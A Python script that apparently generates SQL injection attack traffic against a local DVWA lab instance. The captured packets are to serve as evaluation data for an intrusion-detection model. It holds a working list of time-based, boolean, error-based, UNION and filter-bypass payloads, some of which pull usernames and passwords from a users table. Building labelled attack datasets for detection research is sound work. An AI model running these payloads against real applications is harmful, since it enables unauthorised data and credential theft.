import requests
import time
import random

BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# DISTINTOS a entren_sqli_low, eval_sqli_low, entren_sqli_med, eval_sqli_med, entren_sqli_high
PAYLOADS_SQLI_EVAL_HIGH = [
    # Time-based distintos
    "2' AND SLEEP(1)--",
    "2' AND SLEEP(2)--",
    "2' OR SLEEP(1)--",
    "2 AND SLEEP(1)",
    "2 AND SLEEP(2)",
    # IF distintos
    "2' AND IF(2=2,SLEEP(1),0)--",
    "2' AND IF(2=3,SLEEP(1),0)--",
    "2' AND IF(LENGTH(version())>5,SLEEP(1),0)--",
    "2' AND IF(ASCII(SUBSTR(version(),1,1))>50,SLEEP(1),0)--",
    "2' AND IF(ASCII(SUBSTR(database(),1,1))>90,SLEEP(1),0)--",
    # Boolean distintos
    "2' AND SUBSTR((SELECT version()),1,1)='5'--",
    "2' AND SUBSTR((SELECT version()),1,1)='8'--",
    "2' AND SUBSTR((SELECT user()),1,1)='r'--",
    "2' AND SUBSTR((SELECT user()),1,1)='a'--",
    "2' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--",
    "2' AND (SELECT COUNT(*) FROM users WHERE username='gordonb')=1--",
    # Error-based distintos
    "2' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
    "2' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "2' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
    "2' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
    # UNION distintos
    "2' UNION SELECT NULL,GROUP_CONCAT(username) FROM users--",
    "2' UNION SELECT NULL,GROUP_CONCAT(password) FROM users--",
    "2' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users LIMIT 1 OFFSET 1--",
    # Bypass distintos
    "2'/**/OR/**/1=1--",
    "2'||'1'='1",
    "2' OR 0x32=0x32--",
    "2' OR CHAR(50)=CHAR(50)--",
    "2 UNION SELECT 0x62,0x63--",
    "2'%20AND%20SLEEP(1)--",
    "2' AND 0x32=0x32--",
]

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli_eval_high(session):
    print("\n[*] Iniciando ataques SQLi HIGH (evaluacion)...")
    payloads = PAYLOADS_SQLI_EVAL_HIGH.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r_get = session.get(f"{BASE_URL}/vulnerabilities/sqli/")
            token = None
            for line in r_get.text.split('\n'):
                if 'user_token' in line and 'value' in line:
                    try:
                        token = line.split('value=')[1].split("'")[1]
                        break
                    except:
                        pass
            data = {"id": payload, "Submit": "Submit"}
            if token:
                data["user_token"] = token
            r = session.post(f"{BASE_URL}/vulnerabilities/sqli/", data=data)
            print(f"  SQLi_EVAL_H | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi High evaluacion completado: {ok}/{len(payloads)} peticiones")

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    print("="*60)
    print("  EVALUACION: SQL INJECTION — NIVEL HIGH")
    print("  Etiqueta real: 'sqli'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_sqli_high.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel HIGH")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")
    if not login(session):
        exit(1)
    ataque_sqli_eval_high(session)
    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_sqli_high.pcap")
    print("="*60)
